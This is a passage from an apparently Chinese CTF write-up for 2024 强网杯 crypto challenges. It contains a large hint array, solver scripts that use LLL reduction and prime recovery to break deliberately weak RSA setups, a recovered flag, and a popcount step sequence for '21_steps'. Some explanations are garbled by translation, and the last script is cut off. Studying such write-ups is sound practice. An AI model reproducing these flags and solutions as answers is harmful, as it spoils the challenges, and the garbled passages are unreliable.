25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 选择 hints 的前 4 个值进行计算</span><br><span class="line">V = hints[:4]</span><br><span class="line">k = Integer(2**800)</span><br><span class="line"></span><br><span class="line"># 构建 LLL 矩阵 M 并简化</span><br><span class="line">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[1:] for b in M.LLL()]</span><br><span class="line"></span><br><span class="line"># 使用 LLL 基简化矩阵</span><br><span class="line">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class="line"></span><br><span class="line"># 尝试找到 kq 的值</span><br><span class="line">kq = None</span><br><span class="line">for s, t in itertools.product(range(4), repeat=2):</span><br><span class="line">    T = s * B[0] + t * B[1]</span><br><span class="line">    a1, a2, a3, a4 = T  # 解压得到系数</span><br><span class="line">    kq_candidate = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class="line">    </span><br><span class="line">    # 判断是否找到有效的因子</span><br><span class="line">    if 1 &lt; kq_candidate &lt; n:</span><br><span class="line">        print(&quot;找到因子:&quot;, kq_candidate, &quot;参数 (s, t):&quot;, s, t)</span><br><span class="line">        kq = kq_candidate</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"># 简化 kq 的值</span><br><span class="line">if kq:</span><br><span class="line">    for i in range(2**16, 1, -1):</span><br><span class="line">        if kq % i == 0:</span><br><span class="line">            kq //= i</span><br><span class="line">    q = int(kq)</span><br><span class="line">    p = int(n // kq)</span><br><span class="line">    </span><br><span class="line">    # 计算私钥 d</span><br><span class="line">    phi_n = (p - 1) * (q - 1)</span><br><span class="line">    d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">    # 解密 enc2</span><br><span class="line">    m2 = pow(enc2, d, n)</span><br><span class="line">    flag2 = long_to_bytes(int(m2)).decode()</span><br><span class="line">    print(&quot;flag2:&quot;, flag2)</span><br><span class="line"></span><br><span class="line">    # 解密 enc3</span><br><span class="line">    m3 = pow(enc3, d, n)</span><br><span class="line">    flag3 = long_to_bytes(int(m3)).decode()</span><br><span class="line">    print(&quot;flag3:&quot;, flag3)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;未找到有效的因子，无法解密。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/b93dfec67a545e597219f5eaf1fc497d.png"><br>即flag为flag{yOu_can_s0lve_the_@pbq_prob1em!!}</p>
<h3 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h3><p>生成素数、加密消息并打印相关信息。-循环生成一个大素数<code>g</code>，并为<code>a</code>和<code>b</code>生成随机整数。确保是<code>2*g*a + 1</code>素<code>2*g*b + 1</code>数，计算<code>h</code>并确保它是素数，计算模数<code>N = 2*h*g + 1</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, iroot, powmod, invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA参数</span></span><br><span class="line">N = <span class="number">55183849509030025090124030581117670138269285060222816085575157680717256638747875744212931254970733090806790296949972181595691334056985731299389725795803597194437583796590159470421389474745899185262107923590098717672256614539692487903018905115101414317734728588165017944582953875382001797791685840144943009461929834568973053574412482858053460208039712729644742021701546179405394077206193861496558084051988970753571079707461675687313221996719916065559345439656140832424350937274839245924798486885498940846393777130233493162321586838189513444145793136882066183433872354372633017480689407552682690580154904327123606125407</span></span><br><span class="line">g = <span class="number">3123460869572266792684619201986894065718090924130578093898780077424094963551368151834505172427876755954273322978497741272406273823882906548580600753903</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C = <span class="number">5028054996092504127846951741131477041698931385202458297803468684165351128462617144484824870195442755072666690588972127804245938820204809564832409365166512604234134804984210569806771479776373822661424462309287865660693879390275136400319682110375161032591025566699840898187203044653348561832832364557039157753556861486826939371859173785796035697203205831023882334115281533482310295207211788407414393740002704453630426845812155269323214841161512837038755273170313331857165301057817115198232115684221533956382680418167051154438127664350165639359101365845424660176910346005067909889848206426334127787730873270586658981136</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 h, u 和 v</span></span><br><span class="line">h = (N - <span class="number">1</span>) // g</span><br><span class="line">u, v = <span class="built_in">divmod</span>(h, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_ciphertext</span>():</span><br><span class="line">    sqrt_N = iroot(mpz(N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    C_approx = sqrt_N // (g * g)</span><br><span class="line"></span><br><span class="line">    base = powmod(<span class="number">2</span>, g, N)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(C_approx) + <span class="number">1</span>):</span><br><span class="line">        D = (iroot(C_approx, <span class="number">2</span>)[<span class="number">0</span>] + <span class="number">1</span>) * i</span><br><span class="line">        final = powmod(base, u, N)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(D)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Checking r*D for i=<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;r * D&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(D)):</span><br><span class="line">                <span class="keyword">if</span> powmod(base, r * D + s, N) == final:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Solution found: r =&quot;</span>, r, <span class="string">&quot;s =&quot;</span>, s, <span class="string">&quot;i =&quot;</span>, i)</span><br><span class="line">                    <span class="keyword">return</span> r * D + s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 c 的值</span></span><br><span class="line">c = solve_ciphertext()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c:&quot;</span>, c)  <span class="comment"># 期望输出: c = 51589121</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算二次方程的 A 和 B</span></span><br><span class="line">A = u - c</span><br><span class="line">B = v + c * g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用求根公式计算 x 和 y</span></span><br><span class="line">delta = iroot(B * B - <span class="number">4</span> * A, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B + delta) // <span class="number">2</span></span><br><span class="line">y = (B - delta) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">a, b = x // <span class="number">2</span>, y // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 p 和 q</span></span><br><span class="line">p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥指数 d</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文</span></span><br><span class="line">m = powmod(C, d, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted message:&quot;</span>, long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6fcbafe292cebf19bb98913a16f87456.png"><br>大概用了半个小时出结果吧</p>
<h3 id="21-steps"><a href="#21-steps" class="headerlink" title="21_steps"></a>21_steps</h3><ul>
<li>代码以特定的命令格式提示用户输入。</li>
<li>定义了一个正则表达式模式来验证输入命令。该模式检查涉及<code>A</code>和<code>B</code>或数值的赋值和运算。<br>不同的运算（<code>+</code>、、等）消耗不同数量的步骤，其中按位移位和加法&#x2F;减法比乘法或除法所需的步骤更少<code>-</code>。<code>*</code></li>
<li>启动成功计数器，循环运行 100 次迭代，生成一个随机的 128 位整数<code>A</code>。</li>
<li>此<code>w</code>函数计算数字（权重）的二进制表示中的 1 的数量。</li>
<li>代码尝试执行用户定义的命令。如果<code>A</code>等于<code>wa</code>（的权重<code>A</code>），则它会增加成功计数器。</li>
<li>如果成功计数器达到 100，它会打印<code>flag</code>。</li>
</ul>
<p>0x55555555555555555555555555555555（十休息：113427455640312821154458202477256070485）<br>二进制表示中，每2位循环为01：0101 0101 0101 …<br>用于在第一步中，将多层的分开，只保留低位。<br>执行B &#x3D; A &gt;&gt; 1; B &#x3D; B &amp; 0x55555555555555555555555555555555; A &#x3D; A - B;将每个端点对中位的 1 个移动到 A 的一个固定位置。<br>0x33333333333333333333333333333333（十休息：68056473384187692692674921486353642291）<br>二进制表示中，每4位循环为0011：0011 0011 0011 …<br>用于将每2位结果组合为4位分组，即在4位分组中对两个2位结果求和。<br>执行B &#x3D; A &amp; 0x33333333333333333333333333333333; A &#x3D; A &gt;&gt; 2; A &#x3D; A &amp; 0x33333333333333333333333333333333; A &#x3D; A + B;可以对4位范围内的1个计数。<br>0x0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f（十休息：20016609818878733144904388672456953615）<br>二进制表示中，每8位循环为00001111：0000 1111 0000 1111 …<br>这一步将每4位的结果合并成8位的结果。<br>执行B &#x3D; A &gt;&gt; 4; A &#x3D; A + B; A &#x3D; A &amp; 0x0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f;，可以在每个8位分组中进行1个的计数。<br>其他步骤：<br>接下来，将结果依次按8位、16位、32位、64位进行累位加，使得最终结果集中在低位。<br>最终，通过A &amp; 127（0x7f）来提取出最低的7位，大约128位中1的总个数。<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_weight</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="comment"># 记录每一步的操作</span></span><br><span class="line">    operations = []</span><br><span class="line"></span><br><span class="line">    B = A &gt;&gt; <span class="number">1</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;1;&quot;</span>)</span><br><span class="line">    B = B &amp; <span class="number">113427455640312821154458202477256070485</span>  <span class="comment"># 0x55555555555555555555555555555555</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=B&amp;113427455640312821154458202477256070485;&quot;</span>)</span><br><span class="line">    A = A - B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A-B;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = A &amp; <span class="number">68056473384187692692674921486353642291</span>  <span class="comment"># 0x33333333333333333333333333333333</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&amp;68056473384187692692674921486353642291;&quot;</span>)</span><br><span class="line">    A = A &gt;&gt; <span class="number">2</span></span><br><span class="line">    operations.append(<span class="string">f&quot;A=A&gt;&gt;2;&quot;</span>)</span><br><span class="line">    A = A &amp; <span class="number">68056473384187692692674921486353642291</span></span><br><span class="line">    operations.append(<span class="string">f&quot;A=A&amp;68056473384187692692674921486353642291;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = A &gt;&gt; <span class="number">4</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;4;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line">    A = A &amp; <span class="number">20016609818878733144904388672456953615</span>  <span class="comment"># 0x0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f</span></span><br><span class="line">    operations.append(<span class="string">f&quot;A=A&amp;20016609818878733144904388672456953615;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = A &gt;&gt; <span class="number">8</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;8;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line">    B = A &gt;&gt; <span class="number">16</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;16;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line">    B = A &gt;&gt; <span class="number">32</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;32;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line">    B = A &gt;&gt; <span class="number">64</span></span><br><span class="line">    operations.append(<span class="string">f&quot;B=A&gt;&gt;64;&quot;</span>)</span><br><span class="line">    A = A + B</span><br><span class="line">    operations.append(<span class="string">f&quot;A=A+B;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># A 的低 7 位即为 1 的个数</span></span><br><span class="line">    A = 